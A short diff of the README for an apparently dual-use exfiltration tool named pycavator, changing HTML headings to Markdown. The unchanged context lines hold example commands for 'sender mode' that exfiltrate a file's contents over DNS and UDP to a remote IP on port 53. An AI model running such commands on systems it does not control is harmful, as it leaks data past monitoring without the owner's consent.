@@ -117,7 +117,7 @@ This command copies the contents of the `cert.pem` file to a new file named `ca.
 - dns.message<br/>
 - dns.resolver<br/>
 
-<b>Examples:</b><br/>
+#### Examples:
 <b>Sender mode: exfiltrate data from a file:</b>
 ```bash
   python pycavator-dns.py -f input.txt -s 192.168.1.101 -p 53 -d example.com -i 1 
@@ -130,7 +130,7 @@ This command copies the contents of the `cert.pem` file to a new file named `ca.
 
 ### UDP
 
-<b>Examples:</b><br/>
+#### Examples:
 <b>Sender mode: exfiltrate data from a file:</b>
 ```bash
 python pycavator-udp.py -f input.txt -s 192.168.1.101 -p 53 -i 1 
